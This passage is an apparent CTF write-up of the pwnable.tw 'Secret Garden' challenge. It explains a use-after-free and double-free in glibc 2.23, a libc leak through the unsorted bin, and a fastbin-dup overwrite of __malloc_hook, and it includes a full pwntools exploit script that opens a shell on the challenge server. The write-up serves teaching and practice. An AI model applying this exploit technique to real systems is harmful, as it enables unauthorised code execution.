NULL.</li>\n</ul>\n</li>\n</ol>\n<h1 id=\"preparation\"><a class=\"markdownIt-Anchor\" href=\"#preparation\">#</a> Preparation</h1>\n<p>I suggest using <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NreXNpZGVyL3B3bmRvY2tlcg==\">pwndocker</span>, since it allows you to switch between different versions of glibc in a breeze, and all the commonly-used exploitation tools are already provided in the container.</p>\n<ul>\n<li>Patching ELF</li>\n</ul>\n<pre><code># patchelf --set-interpreter /glibc/2.23/64/lib/ld-2.23.so ./heap_paradise\n# ldd ./secretgarden\n        linux-vdso.so.1 (0x00007fffcb2f7000)\n        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f0f13c8b000)\n        /glibc/2.23/64/lib/ld-2.23.so =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007f0f1408b000)\n</code></pre>\n<ul>\n<li>To run  <code>secretgarden</code>  locally with glibc 2.23 (stripped):</li>\n</ul>\n<pre><code># LD_PRELOAD=./libc.so.6 ./secretgarden\n</code></pre>\n<ul>\n<li>To run  <code>secretgarden</code>  locally with glibc 2.23 (non-stripped):</li>\n</ul>\n<pre><code># ./secretgarden\n</code></pre>\n<blockquote>\n<p>Note:<br>\nThe non-stripped version of glibc should only be used during exploit script development. You‚Äôll finally need to switch over to the stripped version which comes with the challenge, because they have different offsets for symbols.</p>\n</blockquote>\n<h1 id=\"vulnerability\"><a class=\"markdownIt-Anchor\" href=\"#vulnerability\">#</a> Vulnerability</h1>\n<p>The third option, ‚Äúremove a flower from the garden‚Äù, contains an obvious UAF vulnerability, as it doesn‚Äôt set the freed pointer to NULL.</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>_DWORD <span class=\"token operator\">*</span>ptrToFdField<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rax</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> index<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+4h] [rbp-14h] BYREF</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>index <span class=\"token operator\">&lt;=</span> <span class=\"token number\">99</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span>ptrToFdField <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>flowers<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token operator\">*</span>ptrToFdField <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>flowers<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">8LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Successful\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>To reach the crashing state of this program, we only need to raise a flower and remove it twice.</p>\n<pre><code>Your choice : 3\nWhich flower do you want to remove from the garden:0\n*** Error in `./secretgarden': double free or corruption (fasttop): 0x0000558b995ae450 ***\nAborted (core dumped)\n</code></pre>\n<p>With this vulnerability, we can perform fastbin dup by double freeing a flower. Unfortunately, as all the protections (except FORTIFY) are enabled in this challenge, GOT hijacking is not an easy option. We‚Äôll need to find a way to leak libc base and overwrite either  <code>__malloc_hook</code>  or  <code>__free_hook</code>  with the address of an one gadget.</p>\n<pre><code># checksec --file ./secretgarden\n[*] '/ctf/work/pwnable.tw/secret-garden/secretgarden'\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n    FORTIFY:  Enabled\n</code></pre>\n<h1 id=\"exploitation\"><a class=\"markdownIt-Anchor\" href=\"#exploitation\">#</a> Exploitation</h1>\n<p>Before we begin, let‚Äôs pay attention to the first option, ‚Äúraise a flower‚Äù. Remember that it calls malloc() twice, so if we write  <code>chall.create(0x420)</code>  it will:</p>\n<ul>\n<li>malloc(0x28), which returns a 0x30-byte chunk (including the header)</li>\n<li>malloc(0x420), which returns a 0x430-byte chunk (including the header)</li>\n</ul>\n<h2 id=\"leaking-libc-base\"><a class=\"markdownIt-Anchor\" href=\"#leaking-libc-base\">#</a> Leaking libc base</h2>\n<p>We can allocate and free a large chunk (0x420 bytes) into the unsorted bin, and print its  <code>fd</code>  field to stdout.</p>\n<pre><code>chall.create(0x420)\nchall.remove(0)\nchall.visit()\n</code></pre>\n<p><img data-src=\"bin1.png\" alt=\"\"></p>\n<p>Wait, the freed chunk doesn‚Äôt go into the unsorted bin! That‚Äôs because the large chunk we‚Äôve allocated is next to the top chunk, and when it is freed, it will be merged into the top chunk. To workaround this, simply allocate another small chunk with whatever size other than 0x28.</p>\n<pre><code>chall.create(0x420)\nchall.create(0x38) # new\nchall.remove(0)\nchall.visit()\n</code></pre>\n<p><img data-src=\"bin2.png\" alt=\"\"></p>\n<p>Good. The large chunk now goes into the unsorted bin. To print it via the second option, ‚Äúvisit the garden‚Äù, we need to allocate it again and make sure we don‚Äôt overwrite the  <code>fd</code>  field.</p>\n<pre><code>chall.create(0x420)\nchall.create(0x38)\nchall.remove(0)\nchall.create(0x420, b'') # new\nchall.visit()\n</code></pre>\n<p><img data-src=\"bin3.png\" alt=\"\"></p>\n<p>Unfortunately, if we choose option 1, it won‚Äôt return us the exact same 0x430-byte chunk from before. As we can see, option 1 calls  <code>malloc()</code>  twice, 0x28 and 0x420 respectively. So when the program calls  <code>malloc(0x28)</code> , glibc splits our 0x430-byte free chunk in the unsorted bin into two halves: (1) a 0x30-byte chunk, and (2) a 0x400-byte chunk. This former is returned to the user, while the latter is put into a large bin.</p>\n<p>To workaround this, we need to place a 0x30-byte chunk in a fastbin, so that glibc can return that chunk instead of splitting from our 0x430-byte chunk. As shown below, the  <code>fd</code>  field of the 0x430-byte chunk is successfully leaked to stdout.</p>\n<pre><code>chall.create(0x420)\nchall.create(0x38)\nchall.create(0x28) # new\nchall.remove(2)    # new\nchall.remove(0)\nchall.create(0x420, b'')\nchall.visit()\n</code></pre>\n<pre><code>[*] leaked: 0x7fdad280db0a\n[*] leaked libc_base: 0x7fdad244a000\n</code></pre>\n<p><img data-src=\"leaked.png\" alt=\"\"></p>\n<h2 id=\"overwriting-__malloc_hooklibc-via-fastbin-dup\"><a class=\"markdownIt-Anchor\" href=\"#overwriting-__malloc_hooklibc-via-fastbin-dup\">#</a> Overwriting __malloc_hook@libc via fastbin dup</h2>\n<p>Next, we can use the <strong>fastbin dup</strong> technique to achieve arbitrary write. We need to either:</p>\n<ul>\n<li>overwrite  <code>__malloc_hook@libc</code>  and trigger  <code>malloc()</code> , or</li>\n<li>overwrite  <code>__free_hook@libc</code>  and trigger  <code>free()</code></li>\n</ul>\n<p>Let‚Äôs try to bypass the infamous ‚Äúdouble free or corruption (fasttop)‚Äù error with the ABA pattern [<a href=\"#check-1-double-free-or-corruption-fasttop\">1</a>].</p>\n<pre><code>chall.create(0x68)\nchall.create(0x68)\nchall.remove(4)\nchall.remove(5)\nchall.remove(4)\n</code></pre>\n<p><img data-src=\"bin4.png\" alt=\"\"></p>\n<p>Good. We now have two overlapping (same) chunks in the same fastbin. Now we can overwrite the  <code>fd</code>  field of this chunk.</p>\n<pre><code>chall.create(0x68)\nchall.create(0x68)\nchall.remove(4)\nchall.remove(5)\nchall.remove(4)\nchall.create(0x68, p64(libc_base + libc.sym['__free_hook']))\nchall.create(0x68)\nchall.create(0x68)\nchall.create(0x68, p64(libc_base + one_gadget))\n</code></pre>\n<p><img data-src=\"bin5.png\" alt=\"\"></p>\n<p>Okay, here‚Äôs another restriction we need to bypass. In glibc,  <code>malloc()</code>  will refuse to return a freed chunk from a fastbin if that chunk‚Äôs  <code>size</code>  field is incorrect [<a href=\"#check-2-malloc-memory-corruption-fast\">2</a>].</p>\n<pre><code>Error in `/ctf/work/pwnable.tw/secret-garden/secretgarden': malloc(): memory corruption (fast): 0x00007efdb9063b20 ***\n</code></pre>\n<p>To bypass this, we need to rethink where we‚Äôre trying to write data into. The answer is  <code>__malloc_hook</code>  or  <code>__free_hook</code> , right? Let‚Äôs take a look at that memory region.</p>\n<p><img data-src=\"hooks.png\" alt=\"\"></p>\n<p><img data-src=\"7f.png\" alt=\"\"></p>\n<p>All the bytes near  <code>__free_hook</code>  are all NULL bytes, so it‚Äôs not easy to be overwritten with fastbin dup. However, there‚Äôs a sequence of bytes ‚Äú7f 00 00 00 00 00 00 00‚Äù before  <code>__malloc_hook</code> . If we use these bytes as the free chunk‚Äôs  <code>size</code>  field, then we‚Äôll get a 0x70-byte free chunk, and this is enough for us to overwrite  <code>__malloc_hook</code> .</p>\n<pre><code>chall.create(0x68)\nchall.create(0x68)\nchall.remove(4)\nchall.remove(5)\nchall.remove(4)\nchall.create(0x68, p64(libc_base + libc.sym['__malloc_hook'] - 35))\nchall.create(0x68)\nchall.create(0x68)\nchall.create(0x68, 19 * b'A' + p64(libc_base + one_gadget))\nchall.create(0x68) # trigger __malloc_hook\n</code></pre>\n<h2 id=\"triggering-our-__malloc_hook\"><a class=\"markdownIt-Anchor\" href=\"#triggering-our-__malloc_hook\">#</a> Triggering our __malloc_hook</h2>\n<p>The last thing that will probably annoy you is that the constraints of all four one gadgets are unsatisfiable when  <code>__malloc_hook</code>  is triggered via option 1, ‚Äúraise a flower‚Äù.</p>\n<p><img data-src=\"one_gadget.png\" alt=\"\"></p>\n<p>Fortunately, there‚Äôs another way to trigger  <code>__malloc_hook</code> : via  <code>malloc_printerr()</code> . This function is used to print error message when  <code>malloc()</code>  and  <code>free()</code>  fails, and most importantly, it calls  <code>malloc()</code> . Now back to our question, the easiest way to invoke  <code>malloc_printerr()</code>  is to create a ‚Äúdouble free or corruption (fasttop)‚Äù error [<a href=\"#check-1-double-free-or-corruption-fasttop\">1</a>] on purpose.</p>\n<pre><code>chall.create(0x68)\nchall.create(0x68)\nchall.remove(4)\nchall.remove(5)\nchall.remove(4)\nchall.create(0x68, p64(libc_base + libc.sym['__malloc_hook'] - 35))\nchall.create(0x68)\nchall.create(0x68)\n\n# Prepare a chunk for (fasttop) error\nchall.create(0x48)\n\n# Overwrite __malloc_hook.\nchall.create(0x68, 19 * b'A' + p64(libc_base + one_gadget))\n\n# Trigger &quot;double free or corruption (fasttop)&quot;.\nchall.remove(9)\nchall.remove(9)\n</code></pre>\n<h1 id=\"full-exploit-script\"><a class=\"markdownIt-Anchor\" href=\"#full-exploit-script\">#</a> Full Exploit Script</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/env python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># -*- encoding: utf-8 -*-</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>context<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span>arch <span class=\"token operator\">=</span> <span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os <span class=\"token operator\">=</span> <span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>elf  <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./secretgarden'</span><span class=\"token punctuation\">,</span> checksec <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc_64.so.6'</span><span class=\"token punctuation\">,</span> checksec <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>one_gadget <span class=\"token operator\">=</span> <span class=\"token number\">0xef6c4</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>A8 <span class=\"token operator\">=</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> <span class=\"token string\">b'A'</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Challenge</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> proc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        self<span class=\"token punctuation\">.</span>proc <span class=\"token operator\">=</span> proc</pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">create</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> len_name<span class=\"token punctuation\">,</span> name <span class=\"token operator\">=</span> A8<span class=\"token punctuation\">,</span> color <span class=\"token operator\">=</span> A8<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token triple-quoted-string string\">\"\"\" malloc(0x28), malloc(len_name) \"\"\"</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        self<span class=\"token punctuation\">.</span>proc<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'choice : '</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        self<span class=\"token punctuation\">.</span>proc<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'name :'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>len_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        self<span class=\"token punctuation\">.</span>proc<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'of flower :'</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        self<span class=\"token punctuation\">.</span>proc<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'the flower :'</span><span class=\"token punctuation\">,</span> color<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">visit</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        self<span class=\"token punctuation\">.</span>proc<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'choice : '</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">remove</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        self<span class=\"token punctuation\">.</span>proc<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'choice : '</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        self<span class=\"token punctuation\">.</span>proc<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'garden:'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">cleanup</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        self<span class=\"token punctuation\">.</span>proc<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'choice : '</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'4'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    proc <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'chall.pwnable.tw'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10203</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    chall <span class=\"token operator\">=</span> Challenge<span class=\"token punctuation\">(</span>proc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token comment\"># Prepare a large chunk.</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    chall<span class=\"token punctuation\">.</span>create<span class=\"token punctuation\">(</span><span class=\"token number\">0x420</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token comment\"># Prevents the large chunk from being merged into the top chunk.</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    chall<span class=\"token punctuation\">.</span>create<span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token comment\"># Prevents the 0x430-byte chunk from being split.</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    chall<span class=\"token punctuation\">.</span>create<span class=\"token punctuation\">(</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    chall<span class=\"token punctuation\">.</span>remove<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token comment\"># Free the 0x430-byte chunk into unsorted bin.</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    chall<span class=\"token punctuation\">.</span>remove<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token comment\"># Allocate the 0x430-byte chunk again so that visit() can print it.</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    chall<span class=\"token punctuation\">.</span>create<span class=\"token punctuation\">(</span><span class=\"token number\">0x420</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b''</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'A'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    chall<span class=\"token punctuation\">.</span>visit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    proc<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'flower[3] :'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    leaked <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>proc<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    offset <span class=\"token operator\">=</span> <span class=\"token number\">0x7fb7dafc4b0a</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x7fb7dac01000</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    libc_base <span class=\"token operator\">=</span> leaked <span class=\"token operator\">-</span> offset</pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">'leaked libc_base: &#123;&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    <span class=\"token comment\"># Overwrite __malloc_hook with one gadget using fastbin dup.</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    chall<span class=\"token punctuation\">.</span>create<span class=\"token punctuation\">(</span><span class=\"token number\">0x68</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    chall<span class=\"token punctuation\">.</span>create<span class=\"token punctuation\">(</span><span class=\"token number\">0x68</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    chall<span class=\"token punctuation\">.</span>remove<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    chall<span class=\"token punctuation\">.</span>remove<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    chall<span class=\"token punctuation\">.</span>remove<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    chall<span class=\"token punctuation\">.</span>create<span class=\"token punctuation\">(</span><span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">35</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    chall<span class=\"token punctuation\">.</span>create<span class=\"token punctuation\">(</span><span class=\"token number\">0x68</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>    chall<span class=\"token punctuation\">.</span>create<span class=\"token punctuation\">(</span><span class=\"token number\">0x68</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>    <span class=\"token comment\"># Trigger __malloc_hook.</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    <span class=\"token comment\"># It seems that raising a flower will cause the one gadgets to crash.</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>    <span class=\"token comment\"># An alternative way is to trigger __malloc_hook via malloc_printerr().</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>    <span class=\"token comment\"># To do this, we can trigger a \"double free or corruption (fasttop)\".</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>    chall<span class=\"token punctuation\">.</span>create<span class=\"token punctuation\">(</span><span class=\"token number\">0x48</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># prepare a chunk for (fasttop) error</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>    chall<span class=\"token punctuation\">.</span>create<span class=\"token punctuation\">(</span><span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> <span class=\"token string\">b'A'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>libc_base <span class=\"token operator\">+</span> one_gadget<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># overwrite __malloc_hook</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>    chall<span class=\"token punctuation\">.</span>remove<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>    chall<span class=\"token punctuation\">.</span>remove<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>    proc<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre></pre></td></tr><tr><td data-num=\"83\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>    main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"fastbin-related-error-handling\"><a class=\"markdownIt-Anchor\" href=\"#fastbin-related-error-handling\">#</a> Fastbin-Related Error Handling</h1>\n<h2 id=\"check-1-double-free-or-corruption-fasttop\"><a class=\"markdownIt-Anchor\" href=\"#check-1-double-free-or-corruption-fasttop\">#</a> Check 1: double free or corruption (fasttop)</h2>\n<p>In glibc 2.23,  <code>_int_free()</code>  will refuse to free the given pointer  <code>p</code>  when the first chunk in fastbin is  <code>p</code> .</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/* Check that the top of the bin is not the record we are going to add</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>   (i.e., double free).  */</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span><span class=\"token punctuation\">(</span>old <span class=\"token operator\">==</span> p<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\terrstr <span class=\"token operator\">=</span> <span class=\"token string\">\"double free or corruption (fasttop)\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">goto</span> errout<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>Source: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9lbGl4aXIuYm9vdGxpbi5jb20vZ2xpYmMvZ2xpYmMtMi4yMy9zb3VyY2UvbWFsbG9jL21hbGxvYy5jI0wzOTM3\">https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3937</span></p>\n<p>To bypass this restriction, a commonly used technique 